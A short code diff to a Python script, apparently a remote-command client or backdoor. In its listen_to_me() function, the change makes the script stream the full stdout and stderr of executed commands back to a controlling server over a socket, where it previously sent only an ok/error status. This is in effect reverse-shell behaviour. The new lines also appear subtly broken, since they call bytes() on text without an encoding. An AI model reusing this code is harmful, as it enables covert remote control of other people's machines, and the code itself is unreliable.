@@ -1,6 +1,7 @@
 import base64
 import datetime
 import hashlib
+import io
 import json
 import logging
 import os
@@ -418,11 +419,12 @@ def listen_to_me():
                         # if command_out_stderr != b'':
                         #     command_out_stderr = b"$" + command_out.stderr.read() + b"$"
                         #     my_server.sendall(command_out_stderr)
-                        command_out_stderr = command_out.stderr.read()
-                        if command_out_stderr == b'':
-                            my_server.sendall(b"$ok$")
-                        else:
-                            my_server.sendall(b"$error$")
+                        for line in io.TextIOWrapper(command_out.stdout, encoding="utf-8"):
+                            line = b"$" + bytes(line) + b"$"
+                            my_server.sendall(line)
+                        for line in io.TextIOWrapper(command_out.stderr, encoding="utf-8"):
+                            line = b"$" + bytes(line) + b"$"
+                            my_server.sendall(line)
 
 
                     elif command == "k":
